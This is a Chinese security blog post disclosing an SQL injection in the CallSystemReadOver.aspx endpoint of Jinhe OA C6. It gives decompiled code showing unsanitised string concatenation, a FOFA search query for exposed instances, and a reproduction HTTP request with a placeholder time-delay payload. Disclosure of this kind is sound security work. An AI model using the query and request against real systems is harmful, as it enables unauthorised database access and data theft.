---
title: "金和OA CallSystemReadOver.aspx SQL注入漏洞"
source: https://mrxn.net/jswz/jhsoft-CallSystemReadOver-sqli.html
asset_dir: assets/金和oa-callsystemreadover.aspx-sql注入漏洞
---

# 金和OA CallSystemReadOver.aspx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/8/12 14:26
* 704浏览
* [0评论](#comment)
* 10分钟阅读

深入探索

SQL

数据库

软件


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `CallSystemReadOver.aspx` 接口处存在[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入检测工具

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

根据 CallSystemReadOver.aspx 的源码，在 bin 目录下查找 JHBase.Web.Menu.dll 将其进行反编译后找到 CallSystemReadOver 的处理逻辑

```
public class CallSystemReadOver : JHSoft.Base.Page
{
  protected void Page_Load(object sender, EventArgs e)
  {
    Message.ClearNoSee(this.Request["ID"].ToString());
  }
```

跟进 `ClearNoSee` 方法

```
public static bool ClearNoSee(string MessageID)
{
  DBOperator dbOperator = DBOperatorFactory.GetDBOperator();
  string QueryString = $"update callnosee set DelFlag ='1' where callID='{MessageID}'";
  dbOperator.ExecSQLReInt(QueryString);
  return !dbOperator.IsError;
}
```

参数 `MessageID` 被直接拼接进SQL语句中后执行，无任何过滤或校验，导致[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
POST /c6/JHBase.Web.Menu/CallSystemReadOver.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/x-www-form-urlencoded

MessageID='SQLI_POC
```

[![金和OA CallSystemReadOver.aspx SQL注入漏洞](images/img-001-24b4cf53e178.webp)](https://image.mrxn.net/25c28f57ffe044ccaa3e7849973ccbb8.webp)

成功延时 5 秒

代码安全审计

* 标签：
* [#代码](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81)
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[金和OA CallSystemReadOver.aspx SQL注入漏洞](https://mrxn.net/jswz/jhsoft-CallSystemReadOver-sqli.html)  
文章链接：<https://mrxn.net/jswz/jhsoft-CallSystemReadOver-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALa0lEQVR4AezbgVbkOK8EYL59/3f+L2pNJY7jNAwzDH3ODQdtSaWSbKy46WZ3/3t7e/vfV+1/v75S/ytcwjPNs9yy2QU595njsSy5GZ9pxlz5Y23FZSP3Fb8G8l53f7/KCWwDeZ/u22dt3nzq8MbaVpr0SS4x6x4859OH1qVfkOax/azJBdk14WakNVmvcNYU91kba7eBjOTt/9wJnAZCT58z/sk26X7jU0Nz6UvHoyZ+NHMcvpCuL/8jo7Xpt8KPenwmT6/DGVf1p4GsRDf3707grwyEnv74lOVHCJeY1iLU9nsnWjy4TfDuzLnE76nte8VVku6XfGHxZXSu/Csrfdmcp2sxp74c/5WBfHn1u/B0An9lIPX0lOHxZHP9Lua0g3eiasve3cM3ez/aj4BjXDxnrvjqXUbnOe+PzpU+VjVliTlrkvtb+FcG8rc2c/d5e/uegdwn++UTOA2kruiVfWUVPF7G0nPsEY7WJBd+xOSCY272Z03iEek1Uzvm4tMaGqNdYWpmXGnDzdqKTwMp8rafO4FtIPRTwMc4b5euyeQLOXIc42ea9KdrOP8SXmnCzUj3qTVjs+ZZnBq6T7R0jFAb4vHKwMe4Fb0720De/fv7BU7gv0z/K5j9p5b9aUjuuzFrF16tVbmyq3zxlS8r/0+sevyJ3TfkT07/G2pPA6Gf8qxFx5xx1oxPRnLPMPpZQ68182NMazhjdHQu8Yjz2rSWHaOnubkmcSGtSc0KWWtoHvfnkLcX+/qPns7v7KueiLLUlF9G90JS2zuNypdh4yKiucpfWbTB6BKPmFyQ7j9qOHLRjjjqP/JTFx3H/uELOeZSW3h6yaqCF7X/F9u6B/JiY94GQl+jujZlq30WX0ZraYy2cle20tD1qYmG5hMXcuQ4xqWZjY81c80qnve30lxx9B5wkmB7+ab9bSAn9U38yAlsA8lTQE9qtRs6F22Q5lc14Thr5nqOGjpG2mz/tUhqt8S7Ew6PJy9x8F1y+qa1p8RvEny+T/azwm0gv7n+Lf+mE9j+dDL353ridI7GuXaM+Vgz6q/8PE10PxpX+s9oo0k93Y8d51ziFaYfXf9Mkxxn7X1DcjovgqeBZNJfwdXPlD7J0U8FOyYXnGvCF865xIV0z9KNVrmykaO1xV9Z9MknfobRrpBek8b0oWPcfzp5e7Gv0w15sf19/3ZebIVtIPS1mfdH89hSeLytpDEJOkaoTZcrvCUGJ7ngkDq5ePSMlo45/1vFaNKEXRvuM0jXzVqaZ8dnmnk/s7bibSAV3PbzJ3D511566plqYbZb/mjhnyHdb6WhcxxxpQ1HaxOPyDHHMS5t9s8xR8co2cOutI/kr3/MGhxucuV/SZ9+uL1vSE7pRXAbSE2wbN4XPWk+xqqPpU/iFUZzhWMNvX60ySVeIV3zO9pVn5nj2Lf6c+RSQ/PsOOeqPrYNJKIbf/YEtoGwT5DzO5Zxm5lmuDkOX0j3Lb+MjrleI/04a5OrXlcWTZDuk7iQ5tKjuLLEK6z8aKMmfLjEK+S4Nh3j/mD49mJf2x8XM8nsj55a+MI5N8d0DTtGs0JaN+c485y5uW6Oua6pn6csNbS2uNnoHEdM7Qpp7SqX/qvc9pK1St7cl0/gy4X3QL58dN9TuA2E4xXLtaJ59l/CyQWztcSF4YJ0n8rFkrvC6Ea80o4857WqxzPNmIvPx31mbeIg3QOhnuI2kKeqO/nPTmD700k9QWXPVsbjzwEcMTXsfLjqWZZ4xOLLwpVflphzP3YOkT4Qj/09gvd/cIzfqe271ikLUX4ZXYOkHj2xYenK2LmIaS7xZ7B6xe4b8pkT+4ea7W0vPdlMio7HvSQ346i58lNzlS+eXjPaEelc6crG3OxXviw8x9rKzca1Jn2Cc23Fyc1YuY+MXhv3B8O3F/u6fMnKpFf7pSc651Iz4qyha7Glog+Bx+t14sJZU1wZrUWFB8OpTwSsc1mn8CNt8iOy7jtqnvmXA3lWdOe+7wTugXzf2X6p8zaQuqJl7FfuqmPpyq7yI8+xX9XFomOtSf4ZplfhrCtuNHod9g+5qYkuceGKK57uU/5sVzWzruJoR9wGUoLbfv4Etg+G2UqmlXhE+sngiKPmyqdrxjxHLmvTPGdMPecczUUTpPn0L6Q5GqMdkWOOjqu+bKWlNTSuNCM3+/cNmU/kh+PTB8Psh/OE66kYLdpnOOrLp/uyv44XX0bnyi8b+1b8WRvrRp/uj41OT5zeIicX8VUcvjDaYHGxcEF6TXa8b0hO50Xw9Dsk+1pNlX2SXD/hSJsN8XgC07eQ5mgsrixF5cfC0VrOGM1ck3jEaJ8hvUY0dMw1Rpu12LXholnhfUNWp/KD3PY7ZN4DPdmZrziTpjU0hi+kORqrroyOUeHB8LhFIemYHav3aNEWsuvY/cpdGa27yhef9cofLXzhyI9+5WIjP/rJF943ZDyZF/B/YCAv8FO/8BZOv9TpK1zX58pYa2gepx85vU6JgYgGh5euQfIll+t+WTNIa7Gthcd+ognSPDZtHDxqEn8W7xvy2ZP6R7rfGgg99dUTgj/eMh5PVfqvkNasFlvpR25Vw7HfqJ/91HOsCV94VVO5GMd6Osb9bwzfXuxruyHzZOmpjfuNhs4lDq60I/eRv+oz18yaxIX0vuaaVVz60ehadlzVjdxYH56un2OE2v6HnY0YnG0gA3e7P3gC2wdDPF6/P7OXPBnPtBz7cYyrNn2CtIbG0szGMUfH7H/KYedY+3Pf7GFE1rXRsOfTL7k5Lj5csLjZ7huS03kRvAfyIoPINj78YMj5WtJcmtDxeP2SG7nZj2bG6Oi+7HilrZrkyl9Z8oXsPVn7pSubexVXNvIVj0b3HLnZpzXseN+Q+ZR+ON5+qWcfmfocF09PsvyyWUPn2X/BRrNCdj17Dc2PNbXeaMnRWoR6vDnhHK/qR+7Kx6PntsAvh+bZ9/4r9fStbTQrvG/I6lR+kNsGkqdj3gvnp4CdY/fTo5CdZ+2Xrixr0rriZps1nLU0N2sTr5CuoXGlyV6S46ylORpnLUI9bht7vCXenW0g7/79/QInsA0E2+TY/dUe5ycmGva6aILRJC4MNyN7H45+1ZWlhj1ffFlyweLKEhdWvDL2fhz9qitLXflXRteu8qkPjpptICN5+z93AtvnkEwr+GxLrKef2kKOmuLKaB6nJSpflkT5sXB43OTEI3KdKx2dZ8fi/5XR6z5b774hz07nB3L3QJ4e+r9Pnj4YZgt5qRjxKhd+xNSFo69r+MLkZqxcGV3D9Qev0s2WfuHpPuEL5xytCV9YurLyy8q/ssqvbNQnH45eM3HhfUPqFF7Itl/q9LT4PObnyOQ5186axCuk638nR9dgVfYhl70H8XjTwH4rae7DZu8CrrV0jsas+V62fd83ZDuK13C2gWRan8F56/TERz596BxnjD7axLQ2ceGsKa4sfGHFnzV6DY5YfWJ0bu7Jmi9dasufLbkg5z7bQObiO/6ZEzgNhJ4aZ/ydLdL1eRpSm7iQ1sy5OS5tuCBdyxlnTeLqM9ucY+83567i4tnr2P3KxWg+cXDc02kgEd34MydwD+Rnzv1y1b8ykPHKxc+K9DUNT8eI5BKxvQWl/YjTb8Q5l/gzSPcf+8Wnc5/pk5qVNrnkEtP9cf+npG8v9vVXbgj7hGk/P+f8FIQvnHN0bfgVVt2VRZ/8HIcvpNcqfzSax0bPffC4uZvgNx2u6//KQH5zP7f8yQmcBpKnYYVXfZ5puX4auM7VWnQeFS4Nj6cVpzweuexvFMzcHI/a+HS/xM8w/Uak68NxjIs/DeTZInfu+09gGwg9LT7Gq22x115p6imIRTPHdJ/whTSXmmfIWkvzeFZ+mat9XNlchMftZMfUPtNuA5lFd/wzJ3AP5GfO/XLV/wMAAP//iwzy2gAAAAZJREFUAwBEFJazzEhgAgAAAABJRU5ErkJggg==)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-CallSystemReadOver-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

漏洞扫描服务

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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